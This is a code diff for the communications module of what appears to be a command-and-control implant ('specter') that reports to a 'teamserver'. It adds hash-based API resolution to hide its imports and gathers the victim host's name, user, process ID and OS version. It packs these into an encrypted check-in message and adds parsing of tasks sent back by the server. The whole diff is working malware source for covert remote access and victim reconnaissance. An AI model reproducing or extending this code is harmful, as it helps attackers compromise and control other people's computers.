@@ -87,6 +87,191 @@ static DWORD load32_le_comms(const BYTE *p) {
 }
 
 /* ------------------------------------------------------------------ */
+/*  TLV wire format helpers                                            */
+/* ------------------------------------------------------------------ */
+
+/* TLV version byte */
+#define CHECKIN_TLV_VERSION  0x01
+
+/* Checkin TLV tags (implant -> server) */
+#define TLV_SEQ_NUMBER       0x0001
+#define TLV_IMPLANT_PUBKEY   0x0002
+#define TLV_CHECKIN_COUNT    0x0003
+#define TLV_HOSTNAME         0x0010
+#define TLV_USERNAME         0x0011
+#define TLV_PID              0x0012
+#define TLV_OS_VERSION       0x0013
+#define TLV_INTEGRITY        0x0014
+#define TLV_PROCESS_NAME     0x0015
+#define TLV_INTERNAL_IP      0x0016
+#define TLV_TASK_RESULT      0x0020
+
+/* Response TLV tags (server -> implant) */
+#define TLV_SESSION_ID       0x0100
+#define TLV_TASK_BLOCK       0x0200
+#define TLV_TASK_ID          0x0201
+#define TLV_TASK_TYPE        0x0202
+#define TLV_TASK_ARGS        0x0203
+
+/**
+ * Write a single TLV field: [tag: u16 LE][length: u16 LE][value bytes].
+ * Returns updated position after the written field.
+ */
+static DWORD tlv_put(BYTE *buf, DWORD pos, WORD tag, const BYTE *val, WORD val_len) {
+    buf[pos]     = (BYTE)(tag & 0xFF);
+    buf[pos + 1] = (BYTE)(tag >> 8);
+    buf[pos + 2] = (BYTE)(val_len & 0xFF);
+    buf[pos + 3] = (BYTE)(val_len >> 8);
+    if (val && val_len > 0)
+        spec_memcpy(buf + pos + 4, val, val_len);
+    return pos + 4 + val_len;
+}
+
+/**
+ * Write a TLV field with a u32 LE value.
+ */
+static DWORD tlv_put_u32(BYTE *buf, DWORD pos, WORD tag, DWORD val) {
+    BYTE v[4];
+    v[0] = (BYTE)(val);
+    v[1] = (BYTE)(val >> 8);
+    v[2] = (BYTE)(val >> 16);
+    v[3] = (BYTE)(val >> 24);
+    return tlv_put(buf, pos, tag, v, 4);
+}
+
+/**
+ * Write a TLV field with a string value (no null terminator in wire).
+ */
+static DWORD tlv_put_str(BYTE *buf, DWORD pos, WORD tag, const char *str) {
+    DWORD len = 0;
+    if (str) { const char *p = str; while (*p) { p++; len++; } }
+    return tlv_put(buf, pos, tag, (const BYTE *)str, (WORD)len);
+}
+
+/* ------------------------------------------------------------------ */
+/*  Host information gathering                                         */
+/* ------------------------------------------------------------------ */
+
+/**
+ * Gather hostname via PEB-resolved GetComputerNameA.
+ * Returns length of hostname string (excluding null), 0 on failure.
+ */
+static DWORD gather_hostname(char *buf, DWORD buf_len) {
+    typedef BOOL (__attribute__((ms_abi)) *fn_GetComputerNameA)(char *, DWORD *);
+    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+    if (!k32) return 0;
+    fn_GetComputerNameA pGetName = (fn_GetComputerNameA)find_export_by_hash(k32, HASH_GETCOMPUTERNAMEA);
+    if (!pGetName) return 0;
+    DWORD size = buf_len - 1;
+    if (!pGetName(buf, &size)) return 0;
+    buf[size] = 0;
+    return size;
+}
+
+/**
+ * Gather username via PEB-resolved GetUserNameA (advapi32).
+ * Returns length of username string (excluding null), 0 on failure.
+ */
+static DWORD gather_username(char *buf, DWORD buf_len) {
+    typedef BOOL (__attribute__((ms_abi)) *fn_GetUserNameA)(char *, DWORD *);
+    PVOID adv = find_module_by_hash(HASH_ADVAPI32_DLL);
+    if (!adv) {
+        /* advapi32 might not be loaded — try LoadLibraryA */
+        typedef PVOID (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *);
+        PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+        if (k32) {
+            fn_LoadLibraryA pLoad = (fn_LoadLibraryA)find_export_by_hash(k32, 0x0666395B);
+            if (pLoad) {
+                char name[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
+                adv = pLoad(name);
+            }
+        }
+    }
+    if (!adv) return 0;
+    fn_GetUserNameA pGetUser = (fn_GetUserNameA)find_export_by_hash(adv, HASH_GETUSERNAMEA);
+    if (!pGetUser) return 0;
+    DWORD size = buf_len;
+    if (!pGetUser(buf, &size)) return 0;
+    if (size > 0) size--; /* Remove null terminator from count */
+    return size;
+}
+
+/**
+ * Gather current PID from TEB (GS:0x30 -> TEB, +0x40 -> ClientId.UniqueProcess).
+ */
+static DWORD gather_pid(void) {
+    PVOID teb;
+    __asm__ volatile ("mov %%gs:0x30, %0" : "=r" (teb));
+    return (DWORD)(QWORD)(*(PVOID *)((PBYTE)teb + 0x40));
+}
+
+/**
+ * Gather OS version string "Major.Minor.Build" via RtlGetVersion (ntdll).
+ * Returns length of version string, 0 on failure.
+ */
+static DWORD gather_os_version(char *buf, DWORD buf_len) {
+    typedef struct {
+        ULONG Size;
+        ULONG Major;
+        ULONG Minor;
+        ULONG Build;
+        ULONG Platform;
+        WCHAR CSDVersion[128];
+    } RTL_OSVERSIONINFOW;
+    typedef NTSTATUS (__attribute__((ms_abi)) *fn_RtlGetVersion)(RTL_OSVERSIONINFOW *);
+
+    PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
+    if (!ntdll) return 0;
+    fn_RtlGetVersion pVer = (fn_RtlGetVersion)find_export_by_hash(ntdll, HASH_RTLGETVERSION);
+    if (!pVer) return 0;
+
+    RTL_OSVERSIONINFOW vi;
+    spec_memset(&vi, 0, sizeof(vi));
+    vi.Size = sizeof(vi);
+    if (pVer(&vi) != 0) return 0;
+
+    /* Format: "Major.Minor.Build" */
+    DWORD pos = 0;
+    pos += uint_to_str(vi.Major, buf + pos, buf_len - pos);
+    if (pos < buf_len) buf[pos++] = '.';
+    pos += uint_to_str(vi.Minor, buf + pos, buf_len - pos);
+    if (pos < buf_len) buf[pos++] = '.';
+    pos += uint_to_str(vi.Build, buf + pos, buf_len - pos);
+    return pos;
+}
+
+/* ------------------------------------------------------------------ */
+/*  TLV response parser                                                */
+/* ------------------------------------------------------------------ */
+
+/**
+ * Parse a TLV-encoded checkin response from the teamserver.
+ * Extracts SESSION_ID and iterates TASK_BLOCK entries.
+ */
+static void parse_checkin_response(COMMS_CONTEXT *comms, const BYTE *data, DWORD len) {
+    if (len < 1 || data[0] != CHECKIN_TLV_VERSION) return;
+
+    DWORD pos = 1;
+    while (pos + 4 <= len) {
+        WORD tag  = (WORD)data[pos] | ((WORD)data[pos + 1] << 8);
+        WORD vlen = (WORD)data[pos + 2] | ((WORD)data[pos + 3] << 8);
+        pos += 4;
+        if (pos + vlen > len) break;
+
+        switch (tag) {
+        case TLV_SESSION_ID:
+            /* Store session ID for future checkins (optional) */
+            break;
+        case TLV_TASK_BLOCK:
+            /* Parse nested task TLV — dispatch to task handler */
+            /* TODO: implement task execution */
+            break;
+        }
+        pos += vlen;
+    }
+}
+
+/* ------------------------------------------------------------------ */
 /*  API resolution                                                     */
 /* ------------------------------------------------------------------ */
 
@@ -770,19 +955,50 @@ NTSTATUS comms_http_parse_response(const BYTE *data, DWORD data_len,
 /* ------------------------------------------------------------------ */
 
 /**
- * Build the plaintext check-in payload.
- * Format: [4-byte seq][32-byte implant pubkey][4-byte checkin_count]
- * Returns payload size.
+ * Build a TLV-encoded check-in payload with host information.
+ * Wire format: [1-byte version = 0x01][TLV fields...]
+ * Each TLV: [2-byte LE tag][2-byte LE length][value bytes]
+ * Returns total payload size, or 0 on error.
  */
 static DWORD build_checkin_payload(IMPLANT_CONFIG *cfg, DWORD seq,
                                     BYTE *out, DWORD out_len) {
-    DWORD needed = 4 + 32 + 4; /* seq + pubkey + checkin_count */
-    if (out_len < needed) return 0;
+    if (!cfg || !out || out_len < 64) return 0;
 
-    store32_le_comms(out, seq);
-    spec_memcpy(out + 4, cfg->implant_pubkey, 32);
-    store32_le_comms(out + 36, cfg->checkin_count);
-    return needed;
+    DWORD pos = 0;
+
+    /* Version byte */
+    out[pos++] = CHECKIN_TLV_VERSION;
+
+    /* Required fields */
+    pos = tlv_put_u32(out, pos, TLV_SEQ_NUMBER, seq);
+    pos = tlv_put(out, pos, TLV_IMPLANT_PUBKEY, cfg->implant_pubkey, 32);
+    pos = tlv_put_u32(out, pos, TLV_CHECKIN_COUNT, cfg->checkin_count);
+
+    /* Host info — hostname */
+    char hostname[64];
+    DWORD hlen = gather_hostname(hostname, sizeof(hostname));
+    if (hlen > 0)
+        pos = tlv_put_str(out, pos, TLV_HOSTNAME, hostname);
+
+    /* Host info — username */
+    char username[64];
+    DWORD ulen = gather_username(username, sizeof(username));
+    if (ulen > 0)
+        pos = tlv_put_str(out, pos, TLV_USERNAME, username);
+
+    /* Host info — PID */
+    DWORD pid = gather_pid();
+    pos = tlv_put_u32(out, pos, TLV_PID, pid);
+
+    /* Host info — OS version */
+    char os_ver[32];
+    DWORD olen = gather_os_version(os_ver, sizeof(os_ver));
+    if (olen > 0)
+        pos = tlv_put_str(out, pos, TLV_OS_VERSION, os_ver);
+
+    /* TODO: integrity level, process name, internal IP — add later */
+
+    return pos;
 }
 
 /**
@@ -826,14 +1042,14 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     IMPLANT_CONFIG *cfg = cfg_get(ctx);
     if (!cfg) return STATUS_UNSUCCESSFUL;
 
-    /* Build plaintext payload */
-    BYTE payload[128];
+    /* Build plaintext TLV payload */
+    BYTE payload[512];
     DWORD payload_len = build_checkin_payload(cfg, comms->msg_seq, payload, sizeof(payload));
     if (payload_len == 0) return STATUS_UNSUCCESSFUL;
 
     NTSTATUS status;
     CHANNEL_CONFIG *ch = &cfg->channels[comms->active_channel];
-    BYTE http_buf[4096];
+    BYTE http_buf[8192];
     DWORD http_len = 0;
 
     if (comms->profile && comms->profile->initialized) {
@@ -879,7 +1095,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         BYTE nonce[AEAD_NONCE_SIZE];
         generate_nonce(comms->msg_seq, cfg->implant_pubkey, nonce);
 
-        BYTE ciphertext[128];
+        BYTE ciphertext[512];
         BYTE tag[AEAD_TAG_SIZE];
         spec_aead_encrypt(comms->session_key, nonce, payload, payload_len,
                            NULL, 0, ciphertext, tag);
@@ -888,7 +1104,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         DWORD wire_body_len = COMMS_WIRE_HEADER_SIZE + payload_len + COMMS_WIRE_TAG_SIZE;
         DWORD wire_total = COMMS_WIRE_LEN_SIZE + wire_body_len;
 
-        BYTE wire_buf[512];
+        BYTE wire_buf[1024];
         if (wire_total > sizeof(wire_buf)) return STATUS_BUFFER_TOO_SMALL;
 
         DWORD wp = 0;
@@ -955,17 +1171,18 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
                                          &comms->profile->transform,
                                          resp_plain, &resp_plain_len,
                                          sizeof(resp_plain));
-                if (NT_SUCCESS(status)) {
-                    /* TODO: Process decrypted tasks from resp_plain */
+                if (NT_SUCCESS(status) && resp_plain_len > 0) {
+                    parse_checkin_response(comms, resp_plain, resp_plain_len);
                 }
                 spec_memset(resp_plain, 0, sizeof(resp_plain));
             }
-        } else if (body_len > COMMS_WIRE_LEN_SIZE + COMMS_WIRE_NONCE_SIZE + COMMS_WIRE_TAG_SIZE) {
-            /* Legacy wire format */
+        } else if (body_len > COMMS_WIRE_LEN_SIZE + COMMS_WIRE_HEADER_SIZE + COMMS_WIRE_TAG_SIZE) {
+            /* Legacy wire format:
+               [4-byte LE len][12-byte server_id][12-byte nonce][ciphertext][16-byte tag] */
             DWORD resp_wire_len = load32_le_comms(body);
-            const BYTE *resp_nonce = body + COMMS_WIRE_LEN_SIZE;
-            DWORD resp_ct_len = resp_wire_len - COMMS_WIRE_NONCE_SIZE - COMMS_WIRE_TAG_SIZE;
-            const BYTE *resp_ct = body + COMMS_WIRE_LEN_SIZE + COMMS_WIRE_NONCE_SIZE;
+            const BYTE *resp_nonce = body + COMMS_WIRE_LEN_SIZE + COMMS_WIRE_IMPLANT_ID;
+            DWORD resp_ct_len = resp_wire_len - COMMS_WIRE_HEADER_SIZE - COMMS_WIRE_TAG_SIZE;
+            const BYTE *resp_ct = body + COMMS_WIRE_LEN_SIZE + COMMS_WIRE_HEADER_SIZE;
             const BYTE *resp_tag = resp_ct + resp_ct_len;
 
             BYTE resp_plain[512];
@@ -974,7 +1191,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
                                              resp_ct, resp_ct_len, NULL, 0,
                                              resp_plain, resp_tag);
                 if (ok) {
-                    /* TODO: Process decrypted tasks from resp_plain */
+                    parse_checkin_response(comms, resp_plain, resp_ct_len);
                 }
                 spec_memset(resp_plain, 0, sizeof(resp_plain));
             }
@@ -1063,8 +1280,8 @@ NTSTATUS comms_rotate_channel(IMPLANT_CONTEXT *ctx) {
     NTSTATUS status = comms_tcp_connect(comms, ch->url, ch->port);
     if (!NT_SUCCESS(status)) return status;
 
-    /* TLS for HTTP channels */
-    if (ch->type == CHANNEL_HTTP) {
+    /* TLS handshake if channel requires it */
+    if (ch->needs_tls && g_comms_ctx.api.tls_available) {
         status = comms_tls_handshake(comms, ch->url);
         if (!NT_SUCCESS(status)) {
             comms_tcp_close(comms);
@@ -1095,18 +1312,38 @@ DWORD comms_get_backoff_delay(DWORD index) {
     return g_backoff_schedule[index];
 }
 
-/* Simple tick counter — returns a monotonic ms value for backoff timing */
+/* KUSER_SHARED_DATA system time access (same struct as config.c) */
+#ifndef KUSER_SHARED_DATA_ADDR
+#define KUSER_SHARED_DATA_ADDR   0x7FFE0000ULL
+#endif
+#ifndef KSSD_SYSTEM_TIME_OFFSET
+#define KSSD_SYSTEM_TIME_OFFSET  0x14
+#endif
+
+typedef struct _COMMS_KSYSTEM_TIME {
+    ULONG LowPart;
+    LONG  High1Time;
+    LONG  High2Time;
+} COMMS_KSYSTEM_TIME;
+
+/* Simple tick counter — returns monotonic ms value for backoff timing */
 static QWORD failover_get_tick(void) {
 #ifdef TEST_BUILD
     /* In tests, use a controllable tick source */
     return g_test_tick_ms;
 #else
-    /* Use NtQuerySystemTime and convert to ms since boot (approximate) */
-    LARGE_INTEGER sys_time;
-    (void)sys_time;
-    sys_time.QuadPart = 0;
-    /* Fallback: use msg_seq as rough proxy if no kernel call available */
-    return (QWORD)g_comms_ctx.msg_seq * 1000ULL;
+    /* Read system time from KUSER_SHARED_DATA (same as cfg_get_system_time) */
+    volatile COMMS_KSYSTEM_TIME *st =
+        (volatile COMMS_KSYSTEM_TIME *)(KUSER_SHARED_DATA_ADDR + KSSD_SYSTEM_TIME_OFFSET);
+    LONG high;
+    ULONG low;
+    do {
+        high = st->High1Time;
+        low  = st->LowPart;
+    } while (high != st->High2Time);
+    QWORD filetime = ((QWORD)(ULONG)high << 32) | (QWORD)low;
+    /* Convert 100ns ticks to milliseconds */
+    return filetime / 10000ULL;
 #endif
 }
 
@@ -1243,7 +1480,7 @@ NTSTATUS comms_failover(IMPLANT_CONTEXT *ctx) {
             continue;
         }
 
-        if (ch->type == CHANNEL_HTTP) {
+        if (ch->needs_tls && g_comms_ctx.api.tls_available) {
             status = comms_tls_handshake(comms, ch->url);
             if (!NT_SUCCESS(status)) {
                 comms_tcp_close(comms);
@@ -1352,7 +1589,7 @@ NTSTATUS comms_retry_failed(IMPLANT_CONTEXT *ctx) {
         return STATUS_UNSUCCESSFUL;
     }
 
-    if (ch->type == CHANNEL_HTTP) {
+    if (ch->needs_tls && g_comms_ctx.api.tls_available) {
         status = comms_tls_handshake(comms, ch->url);
         if (!NT_SUCCESS(status)) {
             comms_tcp_close(comms);
@@ -1422,18 +1659,10 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
     /* Link context */
     ctx->comms_ctx = &g_comms_ctx;
 
-    /* Generate ephemeral X25519 keypair for session key derivation */
-    BYTE eph_priv[X25519_KEY_SIZE];
-    BYTE eph_pub[X25519_KEY_SIZE];
-    if (!spec_x25519_generate_keypair(eph_priv, eph_pub)) {
-        /* Fallback: use implant keypair from config */
-        spec_memcpy(eph_priv, cfg->implant_privkey, 32);
-        spec_memcpy(eph_pub, cfg->implant_pubkey, 32);
-    }
-
-    /* Derive session key via X25519 + HKDF */
+    /* Derive session key: X25519(config_privkey, server_pubkey) + HKDF.
+       The config keypair is unique per build — no ephemeral key needed. */
     BYTE shared_secret[X25519_KEY_SIZE];
-    spec_x25519_scalarmult(shared_secret, eph_priv, cfg->teamserver_pubkey);
+    spec_x25519_scalarmult(shared_secret, cfg->implant_privkey, cfg->teamserver_pubkey);
 
     /* HKDF: salt = implant_pubkey, IKM = shared_secret, info = "specter-session" */
     const char *info = "specter-session";
@@ -1443,7 +1672,6 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
                       g_comms_ctx.session_key, 32);
 
     /* Zeroize sensitive intermediates */
-    spec_memset(eph_priv, 0, sizeof(eph_priv));
     spec_memset(shared_secret, 0, sizeof(shared_secret));
 
     /* Find primary channel (lowest priority number) */
@@ -1468,8 +1696,8 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
     status = comms_tcp_connect(&g_comms_ctx, ch->url, ch->port);
     if (!NT_SUCCESS(status)) return (NTSTATUS)0xC0000172; /* 172 = TCP connect */
 
-    /* TLS handshake for HTTPS channels */
-    if (ch->type == CHANNEL_HTTP) {
+    /* TLS handshake — only for channels with https:// scheme */
+    if (ch->needs_tls && g_comms_ctx.api.tls_available) {
         status = comms_tls_handshake(&g_comms_ctx, ch->url);
         if (!NT_SUCCESS(status)) {
             comms_tcp_close(&g_comms_ctx);
